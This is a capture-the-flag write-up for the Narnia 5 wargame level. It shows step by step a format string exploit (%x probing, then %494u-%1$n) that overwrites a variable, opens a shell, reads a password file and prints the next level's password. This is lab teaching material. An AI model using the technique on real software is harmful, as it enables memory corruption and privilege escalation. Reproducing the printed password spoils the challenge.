# Writeup for Narnia 5

So on analysing the binary and trying a buffer overflow, we see that it's not possible because the string is being terminated and its reading the length. 

However, we are seeing a function
```text
snprintf
```

It functions similar to printf, but it does bounds checking. So it won't print out more than its supposed to. But no format strings are passed to it

That means it could be vulnerable to format string vulnerability!

Cool, let's test it.
## Proof of Concept

```text
narnia5@narnia:/narnia$ ./narnia5 %x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [f7fc5000] (8)
i = 1 (0xffffd6e0)
```

Now we try to find where the string is reflected to us in the buffer.

```text
narnia5@narnia:/narnia$ ./narnia5 AAAA-%1\$x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAA-41414141] (13)
```

Perfect! Now let's replace A with the address where they're telling us variable i is located and then a payload equivalent to size 500, as we can't really write 500 in the buffer. So that the value 500 is written into the address we pass. (We are using the %N property of printf)
```text
narnia5@narnia:/narnia$ ./narnia5 $(python -c 'print "\xe0\xd6\xff\xff"')-%1\$n
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [����-] (5)
i = 5 (0xffffd6e0)
```

## Completed Exploit 

Cool, now that we are changing the value, and now we know how many spoiler numbers are being written, let's pad our payload to reflect 500.

```text
narnia5@narnia:/narnia$ ./narnia5 $(python -c 'print "\xe0\xd6\xff\xff"')-%494u-%1\$n
Change i's value from 1 -> 500. GOOD
$ cat /etc/narnia_pass/narnia6
neezocaeng
```
GG, we have shell, 

The password to the next level is 
```text
neezocaeng
```